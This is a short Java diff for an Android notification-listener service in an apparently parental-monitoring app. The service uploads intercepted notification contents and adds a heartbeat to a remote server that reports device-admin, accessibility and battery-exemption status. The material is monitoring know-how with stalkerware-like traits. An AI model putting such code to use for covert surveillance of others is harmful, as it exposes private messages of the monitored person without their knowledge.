@@ -39,6 +39,26 @@ public class SnapNotificationListener extends NotificationListenerService {
         TelemetrySyncHelper.uploadNotification(this, pkg, appName, title, text, postTime);
     }
 
+    @Override
+    public void onListenerConnected() {
+        super.onListenerConnected();
+        getSharedPreferences("snap_companion_prefs", MODE_PRIVATE).edit().putBoolean("is_notification_listener_active", true).apply();
+        try {
+            SharedPreferences prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
+            String server = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
+            String devId = prefs.getString("device_id", null);
+            if (devId != null) {
+                ApiClient.sendHeartbeat(server, devId, 100, false, ParentalSetupHelper.isAccessibilityEnabled(this), ParentalSetupHelper.isDeviceAdminActive(this), ParentalSetupHelper.isBatteryOptimizationIgnored(this), null, null);
+            }
+        } catch (Throwable ignored) {}
+    }
+
+    @Override
+    public void onListenerDisconnected() {
+        super.onListenerDisconnected();
+        getSharedPreferences("snap_companion_prefs", MODE_PRIVATE).edit().putBoolean("is_notification_listener_active", false).apply();
+    }
+
     private String getAppName(String pkg) {
         try {
             PackageManager pm = getPackageManager();
